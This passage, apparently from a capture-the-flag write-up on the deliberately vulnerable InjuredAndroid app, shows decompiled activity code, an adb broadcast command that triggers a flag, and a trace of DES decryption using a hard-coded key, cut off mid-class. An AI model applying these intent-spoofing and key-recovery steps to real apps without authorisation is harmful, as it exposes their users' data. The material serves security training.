class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">i2</span> <span class=\"o\">!=</span> <span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>                    <span class=\"nx\">Toast</span><span class=\"p\">.</span><span class=\"nf\">makeText</span><span class=\"p\">(</span><span class=\"nx\">context</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">Keep trying!</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">).</span><span class=\"nf\">show</span><span class=\"p\">();</span>                    <span class=\"k\">return</span><span class=\"p\">;</span>                <span class=\"p\">}</span>                <span class=\"nb\">String</span> <span class=\"nx\">str2</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">You are a winner </span><span class=\"dl\">\"</span> <span class=\"o\">+</span> <span class=\"nx\">k</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Zkdlt0WwtLQ=</span><span class=\"dl\">\"</span><span class=\"p\">);</span>                <span class=\"k\">new</span> <span class=\"nc\">FlagsOverview</span><span class=\"p\">().</span><span class=\"nc\">H</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">);</span>                <span class=\"k\">new</span> <span class=\"nf\">j</span><span class=\"p\">().</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"nx\">context</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">flagFiveButtonColor</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>                <span class=\"nx\">Toast</span><span class=\"p\">.</span><span class=\"nf\">makeText</span><span class=\"p\">(</span><span class=\"nx\">context</span><span class=\"p\">,</span> <span class=\"nx\">str2</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">).</span><span class=\"nf\">show</span><span class=\"p\">();</span>                <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>                <span class=\"nx\">f1454a</span> <span class=\"o\">=</span> <span class=\"nx\">i</span><span class=\"p\">;</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>        <span class=\"nx\">Toast</span><span class=\"p\">.</span><span class=\"nf\">makeText</span><span class=\"p\">(</span><span class=\"nx\">context</span><span class=\"p\">,</span> <span class=\"nx\">str</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">).</span><span class=\"nf\">show</span><span class=\"p\">();</span>        <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"nx\">f1454a</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">;</span>        <span class=\"nx\">f1454a</span> <span class=\"o\">=</span> <span class=\"nx\">i</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Sending a broadcast twice we can trigger the flag.</p><p><code class=\"language-plaintext highlighter-rouge\">adb shell am broadcast -a com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT</code></p><p><img src=\"assets/images/flag5.png\" alt=\"flag5.png\" /></p><h1 id=\"flag-six-login3\">Flag Six: Login3</h1><p><code class=\"language-plaintext highlighter-rouge\">FlagSixLoginActivity</code> is another login-style activity. Again in <code class=\"language-plaintext highlighter-rouge\">submitFlag()</code> our user supplied data is being compared to another object, this time it is being compared to <code class=\"language-plaintext highlighter-rouge\">k.a(\"k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==\")</code>.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kr\">package</span> <span class=\"nx\">b3nac</span><span class=\"p\">.</span><span class=\"nx\">injuredandroid</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">content</span><span class=\"p\">.</span><span class=\"nx\">Intent</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">os</span><span class=\"p\">.</span><span class=\"nx\">Bundle</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">view</span><span class=\"p\">.</span><span class=\"nx\">View</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">widget</span><span class=\"p\">.</span><span class=\"nx\">EditText</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">androidx</span><span class=\"p\">.</span><span class=\"nx\">appcompat</span><span class=\"p\">.</span><span class=\"nx\">widget</span><span class=\"p\">.</span><span class=\"nx\">Toolbar</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">material</span><span class=\"p\">.</span><span class=\"nx\">floatingactionbutton</span><span class=\"p\">.</span><span class=\"nx\">FloatingActionButton</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">material</span><span class=\"p\">.</span><span class=\"nx\">snackbar</span><span class=\"p\">.</span><span class=\"nx\">Snackbar</span><span class=\"p\">;</span><span class=\"cm\">/* loaded from: classes.dex */</span><span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">FlagSixLoginActivity</span> <span class=\"kd\">extends</span> <span class=\"nc\">androidx</span><span class=\"p\">.</span><span class=\"nx\">appcompat</span><span class=\"p\">.</span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">c</span> <span class=\"p\">{</span>    <span class=\"kr\">private</span> <span class=\"nx\">int</span> <span class=\"nx\">w</span><span class=\"p\">;</span>    <span class=\"cm\">/* loaded from: classes.dex */</span>    <span class=\"kd\">static</span> <span class=\"nx\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">a</span> <span class=\"kr\">implements</span> <span class=\"nx\">View</span><span class=\"p\">.</span><span class=\"nx\">OnClickListener</span> <span class=\"p\">{</span>        <span class=\"nf\">a</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"p\">}</span>        <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// android.view.View.OnClickListener</span>        <span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"k\">void</span> <span class=\"nf\">onClick</span><span class=\"p\">(</span><span class=\"nx\">View</span> <span class=\"nx\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">FlagSixLoginActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">c</span><span class=\"p\">(</span><span class=\"nx\">view</span><span class=\"p\">);</span>                <span class=\"nx\">Snackbar</span> <span class=\"nx\">X</span> <span class=\"o\">=</span> <span class=\"nx\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"nx\">view</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">Keys.</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"nx\">X</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Action</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">);</span>                <span class=\"nx\">X</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"nx\">FlagSixLoginActivity</span> <span class=\"nx\">flagSixLoginActivity</span> <span class=\"o\">=</span> <span class=\"nx\">FlagSixLoginActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span class=\"p\">;</span>                <span class=\"nx\">flagSixLoginActivity</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"nx\">flagSixLoginActivity</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">);</span>            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">FlagSixLoginActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">c</span><span class=\"p\">(</span><span class=\"nx\">view</span><span class=\"p\">);</span>                <span class=\"nx\">Snackbar</span> <span class=\"nx\">X2</span> <span class=\"o\">=</span> <span class=\"nx\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"nx\">view</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">Classes.</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"nx\">X2</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Action</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">);</span>                <span class=\"nx\">X2</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"nx\">FlagSixLoginActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"nx\">int</span> <span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">w</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"k\">void</span> <span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"nx\">int</span> <span class=\"nx\">i</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">w</span> <span class=\"o\">=</span> <span class=\"nx\">i</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/* JADX INFO: Access modifiers changed from: protected */</span>    <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity</span>    <span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">Bundle</span> <span class=\"nx\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">layout</span><span class=\"p\">.</span><span class=\"nx\">activity_flag_six_login</span><span class=\"p\">);</span>        <span class=\"nx\">j</span><span class=\"p\">.</span><span class=\"nx\">j</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">);</span>        <span class=\"nc\">C</span><span class=\"p\">((</span><span class=\"nx\">Toolbar</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">.</span><span class=\"nx\">toolbar</span><span class=\"p\">));</span>        <span class=\"p\">((</span><span class=\"nx\">FloatingActionButton</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">.</span><span class=\"nx\">fab</span><span class=\"p\">)).</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nf\">a</span><span class=\"p\">());</span>    <span class=\"p\">}</span>    <span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"k\">void</span> <span class=\"nf\">submitFlag</span><span class=\"p\">(</span><span class=\"nx\">View</span> <span class=\"nx\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nx\">EditText</span> <span class=\"nx\">editText</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">EditText</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">.</span><span class=\"nx\">editText3</span><span class=\"p\">);</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">editText</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">editText3</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"nx\">editText</span><span class=\"p\">.</span><span class=\"nf\">getText</span><span class=\"p\">().</span><span class=\"nf\">toString</span><span class=\"p\">(),</span> <span class=\"nx\">k</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==</span><span class=\"dl\">\"</span><span class=\"p\">)))</span> <span class=\"p\">{</span>            <span class=\"nx\">Intent</span> <span class=\"nx\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">Intent</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">FlagOneSuccess</span><span class=\"p\">.</span><span class=\"kd\">class</span><span class=\"p\">);</span>            <span class=\"nx\">FlagsOverview</span><span class=\"p\">.</span><span class=\"nx\">G</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>            <span class=\"k\">new</span> <span class=\"nf\">j</span><span class=\"p\">().</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">flagSixButtonColor</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>            <span class=\"nf\">startActivity</span><span class=\"p\">(</span><span class=\"nx\">intent</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Viewing <code class=\"language-plaintext highlighter-rouge\">k()</code> in the in the <code class=\"language-plaintext highlighter-rouge\">b3nac.injuredandroid</code> folder.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">package</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.text.TextUtils</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.util.Base64</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">java.security.InvalidKeyException</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">java.security.NoSuchAlgorithmException</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">java.security.spec.InvalidKeySpecException</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">javax.crypto.BadPaddingException</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">javax.crypto.Cipher</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">javax.crypto.IllegalBlockSizeException</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">javax.crypto.NoSuchPaddingException</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">javax.crypto.SecretKey</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">javax.crypto.SecretKeyFactory</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">javax.crypto.spec.DESKeySpec</span><span class=\"p\">;</span><span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span><span class=\"n\">public</span> <span class=\"k\">class</span> <span class=\"nc\">k</span> <span class=\"p\">{</span>    <span class=\"o\">/*</span> <span class=\"n\">renamed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">a</span>  <span class=\"n\">reason</span><span class=\"p\">:</span> <span class=\"n\">collision</span> <span class=\"k\">with</span> <span class=\"n\">root</span> <span class=\"n\">package</span> <span class=\"n\">name</span> <span class=\"o\">*/</span>    <span class=\"n\">private</span> <span class=\"n\">static</span> <span class=\"n\">final</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">f1472a</span> <span class=\"o\">=</span> <span class=\"n\">h</span><span class=\"p\">.</span><span class=\"nf\">b</span><span class=\"p\">();</span>    <span class=\"o\">/*</span> <span class=\"n\">renamed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">b</span>  <span class=\"n\">reason</span><span class=\"p\">:</span> <span class=\"n\">collision</span> <span class=\"k\">with</span> <span class=\"n\">root</span> <span class=\"n\">package</span> <span class=\"n\">name</span> <span class=\"o\">*/</span>    <span class=\"n\">private</span> <span class=\"n\">static</span> <span class=\"n\">final</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">f1473b</span> <span class=\"o\">=</span> <span class=\"n\">h</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">();</span>    <span class=\"n\">public</span> <span class=\"n\">static</span> <span class=\"n\">String</span> <span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">String</span> <span class=\"nb\">str</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"nf\">c</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"k\">try</span> <span class=\"p\">{</span>                <span class=\"n\">SecretKey</span> <span class=\"n\">generateSecret</span> <span class=\"o\">=</span> <span class=\"n\">SecretKeyFactory</span><span class=\"p\">.</span><span class=\"nf\">getInstance</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">DES</span><span class=\"sh\">\"</span><span class=\"p\">).</span><span class=\"nf\">generateSecret</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"nc\">DESKeySpec</span><span class=\"p\">(</span><span class=\"n\">f1472a</span><span class=\"p\">));</span>                <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">decode</span> <span class=\"o\">=</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">Cipher</span> <span class=\"n\">cipher</span> <span class=\"o\">=</span> <span class=\"n\">Cipher</span><span class=\"p\">.</span><span class=\"nf\">getInstance</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">DES</span><span class=\"sh\">\"</span><span class=\"p\">);</span>                <span class=\"n\">cipher</span><span class=\"p\">.</span><span class=\"nf\">init</span><span class=\"p\">(</span><span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"n\">generateSecret</span><span class=\"p\">);</span>                <span class=\"k\">return</span> <span class=\"n\">new</span> <span class=\"nc\">String</span><span class=\"p\">(</span><span class=\"n\">cipher</span><span class=\"p\">.</span><span class=\"nf\">doFinal</span><span class=\"p\">(</span><span class=\"n\">decode</span><span class=\"p\">));</span>            <span class=\"p\">}</span> <span class=\"nf\">catch </span><span class=\"p\">(</span><span class=\"n\">InvalidKeyException</span> <span class=\"o\">|</span> <span class=\"n\">NoSuchAlgorithmException</span> <span class=\"o\">|</span> <span class=\"n\">InvalidKeySpecException</span> <span class=\"o\">|</span> <span class=\"n\">BadPaddingException</span> <span class=\"o\">|</span> <span class=\"n\">IllegalBlockSizeException</span> <span class=\"o\">|</span> <span class=\"n\">NoSuchPaddingException</span> <span class=\"n\">e</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">e</span><span class=\"p\">.</span><span class=\"nf\">printStackTrace</span><span class=\"p\">();</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">System</span><span class=\"p\">.</span><span class=\"n\">out</span><span class=\"p\">.</span><span class=\"nf\">println</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Not a string!</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"p\">}</span>        <span class=\"k\">return</span> <span class=\"nb\">str</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">static</span> <span class=\"n\">String</span> <span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"n\">String</span> <span class=\"nb\">str</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"nf\">c</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"k\">try</span> <span class=\"p\">{</span>                <span class=\"n\">SecretKey</span> <span class=\"n\">generateSecret</span> <span class=\"o\">=</span> <span class=\"n\">SecretKeyFactory</span><span class=\"p\">.</span><span class=\"nf\">getInstance</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">DES</span><span class=\"sh\">\"</span><span class=\"p\">).</span><span class=\"nf\">generateSecret</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"nc\">DESKeySpec</span><span class=\"p\">(</span><span class=\"n\">f1473b</span><span class=\"p\">));</span>                <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">decode</span> <span class=\"o\">=</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">Cipher</span> <span class=\"n\">cipher</span> <span class=\"o\">=</span> <span class=\"n\">Cipher</span><span class=\"p\">.</span><span class=\"nf\">getInstance</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">DES</span><span class=\"sh\">\"</span><span class=\"p\">);</span>                <span class=\"n\">cipher</span><span class=\"p\">.</span><span class=\"nf\">init</span><span class=\"p\">(</span><span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"n\">generateSecret</span><span class=\"p\">);</span>                <span class=\"k\">return</span> <span class=\"n\">new</span> <span class=\"nc\">String</span><span class=\"p\">(</span><span class=\"n\">cipher</span><span class=\"p\">.</span><span class=\"nf\">doFinal</span><span class=\"p\">(</span><span class=\"n\">decode</span><span class=\"p\">));</span>            <span class=\"p\">}</span> <span class=\"nf\">catch </span><span class=\"p\">(</span><span class=\"n\">InvalidKeyException</span> <span class=\"o\">|</span> <span class=\"n\">NoSuchAlgorithmException</span> <span class=\"o\">|</span> <span class=\"n\">InvalidKeySpecException</span> <span class=\"o\">|</span> <span class=\"n\">BadPaddingException</span> <span class=\"o\">|</span> <span class=\"n\">IllegalBlockSizeException</span> <span class=\"o\">|</span> <span class=\"n\">NoSuchPaddingException</span> <span class=\"n\">e</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">e</span><span class=\"p\">.</span><span class=\"nf\">printStackTrace</span><span class=\"p\">();</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">System</span><span class=\"p\">.</span><span class=\"n\">out</span><span class=\"p\">.</span><span class=\"nf\">println</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Not a string!</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"p\">}</span>        <span class=\"k\">return</span> <span class=\"nb\">str</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">static</span> <span class=\"n\">boolean</span> <span class=\"nf\">c</span><span class=\"p\">(</span><span class=\"n\">String</span> <span class=\"nb\">str</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">TextUtils</span><span class=\"p\">.</span><span class=\"nf\">isEmpty</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"k\">return</span> <span class=\"n\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>        <span class=\"k\">try</span> <span class=\"p\">{</span>            <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"k\">return</span> <span class=\"n\">true</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"nf\">catch </span><span class=\"p\">(</span><span class=\"nb\">Exception</span> <span class=\"n\">unused</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"k\">return</span> <span class=\"n\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">\"k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==\"</code> is being passed into <code class=\"language-plaintext highlighter-rouge\">a()</code> as <code class=\"language-plaintext highlighter-rouge\">str</code>. <code class=\"language-plaintext highlighter-rouge\">str</code> is base64 decoded then passed to <code class=\"language-plaintext highlighter-rouge\">String(cipher.doFinal(decode))</code> as <code class=\"language-plaintext highlighter-rouge\">decode</code> where it is decrypted using a DES cipher generated using <code class=\"language-plaintext highlighter-rouge\">DESKeySpec(f1472a)</code> from <code class=\"language-plaintext highlighter-rouge\">SecretKeyFactory</code>.</p><p>From Oracle’s <code class=\"language-plaintext highlighter-rouge\">DESKeySpec</code> documentation:  “<code class=\"language-plaintext highlighter-rouge\">DESKeySpec(byte[] key)</code> Creates a DESKeySpec object using the first 8 bytes in <code class=\"language-plaintext highlighter-rouge\">key</code> as the key material for the DES key.”</p><p>With that being said <code class=\"language-plaintext highlighter-rouge\">f1472a</code> is going to be the <code class=\"language-plaintext highlighter-rouge\">key</code> object for <code class=\"language-plaintext highlighter-rouge\">DESKeySpec()</code>.</p><p>We see that the key <code class=\"language-plaintext highlighter-rouge\">f1472a</code> is equal to <code class=\"language-plaintext highlighter-rouge\">h.b()</code> so lets track that down.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">package</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.util.Base64</span><span class=\"p\">;</span><span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span><span class=\"n\">public</span> <span class=\"k\">class</span> <span class=\"nc\">h</span> <span class=\"p\">{</span>    <span class=\"o\">/*</span> <span class=\"n\">renamed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">a</span>  <span class=\"n\">reason</span><span class=\"p\">:</span> <span class=\"n\">collision</span> <span class=\"k\">with</span> <span class=\"n\">root</span> <span class=\"n\">package</span> <span class=\"n\">name</span> <span class=\"o\">*/</span>    <span class=\"n\">private</span> <span class=\"n\">static</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">f1469a</span> <span class=\"o\">=</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Q2FwdHVyM1RoMXM=</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>    <span 